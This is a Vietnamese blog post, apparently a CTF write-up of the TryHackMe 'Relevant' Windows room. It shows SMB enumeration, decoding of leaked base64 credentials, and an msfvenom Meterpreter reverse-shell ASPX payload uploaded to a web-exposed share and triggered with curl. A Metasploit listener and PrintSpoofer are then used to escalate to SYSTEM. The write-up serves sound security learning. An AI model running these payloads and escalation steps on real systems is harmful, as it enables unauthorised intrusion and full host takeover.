---
layout: post
author: "Neo"
title: "Tryhackme - Relevant"
date: "2021-11-26"
tags: [
    "tryhackme",
    "web",
    "msfvenom",
    "windows",
    "smb",
    "printspoofer"
]
categories: ctf
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}

Xin chào, Lẩu đây. Hôm nay tôi sẽ giải CTF [Tryhackme - Relevant](https://tryhackme.com/room/relevant)

## Reconnaissance 
Vẫn như thông thường, việc đầu tiên cần làm là quét các cổng đang mở của ip mục tiêu.
```js
PORT      STATE SERVICE       REASON  VERSION
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  syn-ack Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
| ssl-cert: Subject: commonName=Relevant
| Issuer: commonName=Relevant
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-08T07:29:30
| Not valid after:  2023-02-07T07:29:30
| MD5:   58fd 9021 e69c 979c b9b2 83b3 5b20 59e1
| SHA-1: 5f3c 2cb7 9ff0 b109 443b 9813 6fad 5768 a5c8 03e4
| -----BEGIN CERTIFICATE-----
| MIIC1DCCAbygAwIBAgIQI/Rvv/LKG6hAIETCfD4qYzANBgkqhkiG9w0BAQsFADAT
| MREwDwYDVQQDEwhSZWxldmFudDAeFw0yMjA4MDgwNzI5MzBaFw0yMzAyMDcwNzI5
| MzBaMBMxETAPBgNVBAMTCFJlbGV2YW50MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAridw40n6SvFc+v8JUCzyg/kr4MHV6PuHxOSUa0ULDlwkoSYBJeWa
| jouI1vOzfKyZe9t6J6xiyaG3cMu7gBswCVemW3JaUSq3M0KpJTXMGZq/UGU87TxD
| TIsgEwVxX8FyzANIDk1a4st+6xFQeES33zXBlsGbVidxW7Shh3hPAKa5tt/u1xYO
| md9Wg+amFM1mv+afZJ4LSEt7qfS35sqoOIqER0Na2HXS5CfcfRUc34QfOtPbaGsd
| 3zJfFh6idnIxWrWIMBzt5JJuG286zttjM1jZWIUuevA2kIgIlDf/5Pngnodc2sE4
| G7h24ATGycCUaymwpq4ocB7B3idm6ZnqpQIDAQABoyQwIjATBgNVHSUEDDAKBggr
| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAKrQPuiiz++z
| ufha6p579FYmyeHrzk1vDW9paLmFt3ic0E6E5GP25/NfwlObSmXwbr+1seFJf00Z
| SqF2u730F44xdTGzT11gLub69fcXRFerO251m5XwabPmhsHehs0jTYd85wbU2u4t
| hGa+U8WZCFRPk+mAIkTOB3yMRjQEG0FQzQZEL/7BX1/RPdgWhB0eDeNoYEMw64wH
| MT0+4/BTFwxiRqylzbExqec8bxTN58KGIDGemMHYYyBGMlg4Wmb+t+dXPEIBeCOf
| +/2+Kr2+63Hcfs9Byl79YftuK8LyXYkFfBRShNvoSi/WukJa/qCyQfUvAGcZC2QW
| rpp8f0Bu6ac=
|_-----END CERTIFICATE-----
|_ssl-date: 2022-08-09T07:35:45+00:00; -12s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2022-08-09T07:35:08+00:00
49663/tcp open  http          syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h23m48s, deviation: 3h07m51s, median: -12s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-08-09T07:35:07
|_  start_date: 2022-08-09T07:30:05
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-08-09T00:35:08-07:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 58498/tcp): CLEAN (Timeout)
|   Check 2 (port 13141/tcp): CLEAN (Timeout)
|   Check 3 (port 46642/udp): CLEAN (Timeout)
|   Check 4 (port 13285/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```
Tôi có 1 Window server ở đây với port 139 và 445 của SMB service. Thử ghé qua 2 port này trước xem có khai thác được thông tin gì không.
```python
┌──(neo㉿kali)-[~]
└─$ smbclient -L \\\\10.10.84.34
Password for [WORKGROUP\neo]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.84.34 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
Chúng ta có 1 folder tên `nt4wrksv`. Thử truy cập vào thư mục này và tôi có 1 file password.
```python
┌──(neo㉿kali)-[~]
└─$ smbclient \\\\10.10.84.34\\nt4wrksv  
Password for [WORKGROUP\neo]:

Try "help" to get a list of possible commands.
smb: \> 
smb: \> dir
  .                                   D        0  Sat Jul 25 17:46:04 2020
  ..                                  D        0  Sat Jul 25 17:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020

                7735807 blocks of size 4096. 4944824 blocks available
smb: \> get passwords.txt 
getting file \passwords.txt of size 98 as passwords.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```
Lấy nó về và xem bên trong có gì nào.
```python
┌──(neo㉿kali)-[~]
└─$ cat passwords.txt  
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```
Tôi hay sử dụng [web này](https://kt.gy/) để decrypt những base phổ biến như 16, 32, 64, v.v.. Với dòng đầu tiên tôi có user-pass của __Bob__ và dòng thứ 2 là user-pass của __Bill__. 

Do đây là window server nên tôi sẽ thử tạo Meterpreter payload và đẩy nó vào share file:

`msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.18.3.74 lport=2402 -f aspx -o shell.aspx`

Ở đây tôi sử dụng msfvenom với:

`-p`: lựa chọn payload muốn đẩy

`lhost` và `lport` là ip litsener của máy tôi 

`-f`: chọn định dạng file sẽ xuất ra

`-o`: tạo file với tên shell.aspx

Chờ 1 lúc để file tạo thành công
```python
smb: \> put /home/neo/shell.aspx shell.aspx
putting file /home/neo/shell.aspx as \shell.aspx (296.6 kb/s) (average 296.6 kb/s)
smb: \> dir
  .                                   D        0  Tue Aug  9 05:36:44 2022
  ..                                  D        0  Tue Aug  9 05:36:44 2022
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
  shell.aspx                          A  1013006  Tue Aug  9 05:36:47 2022

                7735807 blocks of size 4096. 4912865 blocks available
```
Vậy là up shell thành công. Tạo listener với Metasploit
```python
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp 
payload => windows/x64/meterpreter_reverse_tcp
```
Thiết lập LHOSTS và LPORT giống với trong payload vừa tạo
```python
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.18.3.74:2402 
```
Sau đó tạo request đến web để mở file shell vừa up lên server. Tôi có 2 port tcp ở đây là 80 và 49663, sau khi thử cả 2 thì tôi có `curl http://10.10.189.211:49663/nt4wrksv/shell.aspx` 
```python
meterpreter > getuid
Server username: IIS APPPOOL\DefaultAppPool
meterpreter > shell
Process 2116 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
```
Và tôi tìm được *user flag* trong user Bob
```python
c:\Users\Bob\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\Users\Bob\Desktop

07/25/2020  02:04 PM    <DIR>          .
07/25/2020  02:04 PM    <DIR>          ..
07/25/2020  08:24 AM                35 user.txt
               1 File(s)             35 bytes
               2 Dir(s)  20,255,997,952 bytes free
```
## Privilege escalation
Tôi check thử xem có các đặc quyền nào không
```python
meterpreter > getprivs 

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
```
Tôi để ý có `SeImpersonatePrivilege`, tôi sẽ dùng [payload](https://github.com/itm4n/PrintSpoofer.git) này để thử lấy quyền SYSTEM.

Đầu tiên tạo file .exe
```python
┌──(neo㉿kali)-[~/PrintSpoofer/PrintSpoofer]
└─$ sudo gcc PrintSpoofer.cpp -o PrintSpoofer.exe    
[sudo] password for neo: 
PrintSpoofer.cpp:3:10: fatal error: Windows.h: No such file or directory
    3 | #include <Windows.h>
      |          ^~~~~~~~~~~
compilation terminated.
```
Có vẻ như không chạy được bằng terminal, tôi phải tải vscode về để build file này. Nhưng tôi nhận ra để build được thì tôi lại phải tải Vs Studio và cài thêm C++, chỉ từng ấy thứ đã làm tôi muốn từ bỏ rồi. :sleepy: 

May mắn là đã có người làm thay tôi việc đó up nó lên github, và nó ở [đây](https://github.com/dievus/printspoofer.git). Bây giờ thì chỉ cần clone nó về và đẩy nó vào máy mục tiêu. 
```python
┌──(neo㉿kali)-[~/printspoofer]
└─$ smbclient \\\\10.10.114.141\\nt4wrksv        
Password for [WORKGROUP\neo]:
Try "help" to get a list of possible commands.
smb: \> put PrintSpoofer.exe 
putting file PrintSpoofer.exe as \PrintSpoofer.exe (29.4 kb/s) (average 29.4 kb/s)
smb: \> dir
  .                                   D        0  Wed Aug 10 00:03:19 2022
  ..                                  D        0  Wed Aug 10 00:03:19 2022
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
  PrintSpoofer.exe                    A    27136  Wed Aug 10 00:03:19 2022
  shell.aspx                          A  1013006  Tue Aug  9 22:00:27 2022

                7735807 blocks of size 4096. 5158914 blocks available
```
Chạy lại meterpreter payload và thực hiện lại lệnh `curl`, sau đó tìm xem file exe vừa đẩy lên ở đâu.
```python
c:\>dir "\PrintSpoofer.exe" /s
dir "\PrintSpoofer.exe" /s
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\inetpub\wwwroot\nt4wrksv
```
Bây giờ thì lấy quyền admin thôi.
```python
c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd \users\administrator\desktop
cd \users\administrator\desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of C:\Users\Administrator\Desktop

07/25/2020  08:24 AM    <DIR>          .
07/25/2020  08:24 AM    <DIR>          ..
07/25/2020  08:25 AM                35 root.txt
               1 File(s)             35 bytes
               2 Dir(s)  21,130,473,472 bytes free
```

## Conclusion

Tôi chưa có nhiều kiến thức về window nên thử thách này thực sự đã làm khó tôi đặc biệt là phần leo thang đặc quyền. Tôi sẽ phải học thêm và sẽ làm thêm các CTF của Windows.

Đọc thêm: [SMB Enumeration & Exploitation & Hardening](https://www.exploit-db.com/docs/48760)

Đọc thêm: [Window Privilege Escalation](https://viblo.asia/p/leo-thang-dac-quyen-trong-windows-windows-privilege-escalation-1-service-exploits-vyDZO7QOZwj) 